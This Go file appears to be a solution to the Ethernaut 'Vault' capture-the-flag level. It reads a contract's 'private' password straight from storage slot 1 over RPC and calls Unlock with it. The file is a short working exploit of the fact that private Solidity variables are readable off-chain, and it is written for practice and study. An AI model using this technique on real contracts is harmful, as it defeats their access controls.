package main

import (
	"context"
	"crypto/ecdsa"
	"math/big"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rbrick/ethernaut/contracts"
)

type VaultPuzzle struct{}

func (*VaultPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {
	instanceAddress := common.HexToAddress("0x764a4211682DAFc9A5272B7De3bef569eA14ec63")
	keyedTransactor, err := bind.NewKeyedTransactorWithChainID(privateKey, chainId)

	if err != nil {
		return err
	}

	vaultContract, err := contracts.NewVault(instanceAddress, rpcClient)

	if err != nil {
		return err
	}

	// The password is contained in a private variable in storage. While we can't really read this on-chain
	// We can read private variables off-chain to get a hold of the value.
	// Slots, with exception of mappings, are stored in order
	// Slot 0
	// Slot 1
	// Slot 2
	// The password is stored in slot 1.

	// The slots are encoded as hashes.

	slotNumber := common.BigToHash(big.NewInt(1))

	// We issue a rpc_getStorage, at the latest block number
	password, err := rpcClient.StorageAt(context.Background(), instanceAddress, slotNumber, nil)

	if err != nil {
		return err
	}

	// Unlock the contract
	txn, _ := vaultContract.Unlock(keyedTransactor, [32]byte(password))

	bind.WaitMined(context.Background(), rpcClient, txn)
	return nil
}
